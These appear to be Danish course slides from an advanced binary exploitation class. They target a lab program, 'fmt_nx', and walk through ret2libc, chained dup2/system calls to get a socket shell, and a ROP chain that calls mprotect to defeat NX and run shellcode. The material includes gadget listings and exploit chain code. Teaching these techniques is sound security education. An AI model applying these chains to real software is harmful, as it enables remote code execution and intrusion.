Næste mitigation - Data Execution Prevention
--------------------------------------------

[source,bash]
------------------------------------------------
$ checksec assignments/fmt_nx
[*] '/vagrant/presentations/04-advanced-exploitation/assignments/fmt_nx'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
------------------------------------------------

Næste mitigation - Data Execution Prevention
--------------------------------------------

[source,bash]
------------------------------------------------
$ grep -E '(fmt_nx)|(stack)' /proc/$(pidof fmt_nx)/maps
56559000-5655b000 r-xp 00000000 00:7d 22 /04-advanced-exploitation/fmt_nx
5655b000-5655c000 r--p 00001000 00:7d 22 /04-advanced-exploitation/fmt_nx
5655c000-5655d000 rw-p 00002000 00:7d 22 /04-advanced-exploitation/fmt_nx
ff9ae000-ff9cf000 rw-p 00000000 00:00 0  [stack]
------------------------------------------------

Løsning 1 - ret2libc
--------------------

Udføres `system("/bin/bash");` ser stakken således ud ved første instruktion i `system@libc`:

image::../images/ret2libc_1.png[width=600]

Løsning 1 - ret2libc
--------------------

Hvad nu hvis vi får stakken til at se sådan her ud lige inden en `ret` instruktion?:

image::../images/ret2libc_2.png[width=600]

Hvordan finder vi `system@libc`?
--------------------------------

Fandens komplekst men meget lærerigt at forsøge manuelt.

Rimeligt velbeskrevet her: http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html

Indtil lysten til den slags dukker op kan I benytte `DynELF` klassen fra `pwntools`.

[source,python]
------------------------------------------------
class DynELF:
    ...
    def __init__(self, leak, pointer=None, elf=None):
        ...
------------------------------------------------

Opgave 6 - Lav arbitrary read funktion
--------------------------------------

Test den ved at resolve `system` fra `libc`

Opgave 7 - Returner til `system`
--------------------------------

Hvorfor fik vi ikke en shell?
-----------------------------

Det gjorde vi også:

[source,bash]
------------------------------------------------
[pid  5410] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[pid  5410] execve("/bin/sh", ["sh", "-c", "/bin/bash"], [/* 3 vars */]) = 0
strace: [ Process PID=5410 runs in 64 bit mode. ]
.......
[pid  5403] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xdeadbeef} ---
....
------------------------------------------------

Hvorfor fik vi ikke en shell?
-----------------------------

Vi kommunikerer med processen via en socket med file descriptor 4.

Shellen snakker med stdin, stdout og stderr som har file descriptors 0, 1 og 2

Hvorfor fik vi ikke en shell?
-----------------------------

Husk `findpeersh`?

Den fandt en socket filedescriptor og kopierede den til filedescriptor 0, 1 og 2.

Vi kan gøre det samme.

Opgave 8 - Chained ret2libc
---------------------------

Vi skal gøre dette:

[source,c]
------------------------------------------------
dup2(4, 0);
dup2(4, 1);
dup2(4, 2);
system("/bin/bash");
------------------------------------------------

Opgave 8 - Chained ret2libc
---------------------------

Men det er problematisk

image::../images/bad_chaining.png[width=600]

Opgave 8 - Chained ret2libc
---------------------------

Ryd stakken mellem "kald"

image::../images/good_chaining.png[width=300]

Ingen libc?
-----------

* Statisk lænkede programmer
* Hvis vi ikke kan resolve

Return Oriented Programming (ROP)
---------------------------------

Kræver kontrol med stakken.

ROP Gadget: Kort serie af instruktioner som ender med `ret` eller `call/jmp` til et register

ROP Chain: Serie af gadgets, som opnår et delmål

Kæd dem sammen ved at returnere rundt for at opnå et større mål.

Return Oriented Programming (ROP)
---------------------------------

Indsamling af gadgets

[source,bash]
------------------------------------------------
$ ROPgadget --multibr --binary assignments/fmt_nx
Gadgets information
============================================================
0x00000936 : adc al, 0x24 ; call eax
0x00000983 : adc al, 0x24 ; call ecx
0x00001297 : adc al, 0x41 ; ret
....
0x00000b4d : sub esp, 0x44 ; call 0x8f9
0x0000071d : sub esp, 8 ; call 0x8f9
0x00000931 : test eax, eax ; je 0x92c ; mov dword ptr [esp], edx ; call eax
0x00001293 : xor byte ptr [edx], al ; dec eax ; push cs ; adc al, 0x41 ; ret

Unique gadgets found: 158
------------------------------------------------

Return Oriented Programming (ROP)
---------------------------------

Dem vi kan nøjes med

[source,bash]
------------------------------------------------
0x00000d13 : add esp, 0x44 ; pop ebx ; pop ebp ; ret
0x00000e8d : int 0x80 ; ret
0x0000073d : pop ebx ; ret
0x00000d7b : pop eax ; ret
0x0000073b : les ecx, ptr [eax] ; pop ebx ; ret
0x00000a06 : lea edx, dword ptr [ebx - 0x110] ; mov dword ptr [esp], edx ; call eax
0x00000928 : pop ebx ; pop ebp ; ret
------------------------------------------------

Return Oriented Programming (ROP)
---------------------------------

Slutmålet med vores kæde:

[source,c]
------------------------------------------------
mprotect(shellcode, PAGE_SIZE * 2, PROT_READ|PROT_WRITE|PROT_EXEC);
((void(*))shellcode)();
------------------------------------------------

[source,asm]
------------------------------------------------
mov eax, SYS_mprotect
mov ebx, shellcode
mov ecx, PAGE_SIZE * 2
mov edx, PROT_READ | PROT_WRITE | PROT_EXEC
int 0x80
jmp shellcode
------------------------------------------------

Return Oriented Programming (ROP) - delmål 1
--------------------------------------------

`edx = PROT_READ|PROT_WRITE|PROT_EXEC = 7`

[source,python]
------------------------------------------------
fmt_base + POP_EBX, # pop ebx ; ret
7 + 0x110,          # ->ebx
fmt_base + POP_EAX, # pop eax ; ret
fmt_base + POP2,    # ->eax = pop ebx ; pop ebp ; ret
fmt_base + LEA_EDX, # lea edx, dword ptr [ebx - 0x110] ; mov dword ptr [esp], edx ; call eax
0xdeadbeef,         # Will be overwritten
------------------------------------------------

Return Oriented Programming (ROP) - delmål 2
--------------------------------------------

`ecx = PAGE_SIZE * 2` og `ebx = shellcode`

[source,python]
------------------------------------------------
poke(fmt_base + 0x3000, p32(PAGE_SIZE * 2) + "\0\0")
------------------------------------------------

`fmt_base + 0x3000` er en skrivbar datasektion.

[source,python]
------------------------------------------------
fmt_base + POP_EAX, # pop eax ; ret
fmt_base + 0x3000,  # ->eax
fmt_base + LES_ECX, # les ecx, ptr [eax] ; pop ebx ; ret
buffer & PAGE_MASK, # address to mprotect must be on a page boundary
------------------------------------------------

Return Oriented Programming (ROP) - delmål 3
--------------------------------------------

Udfør systemkald til `mprotect` og spring så til shellcoden

[source,python]
------------------------------------------------
fmt_base + POP_EAX,           # pop eax ; ret
int(constants.SYS_mprotect),  # ->eax
fmt_base + INT_80,            # int 0x80 ; ret
buffer
------------------------------------------------
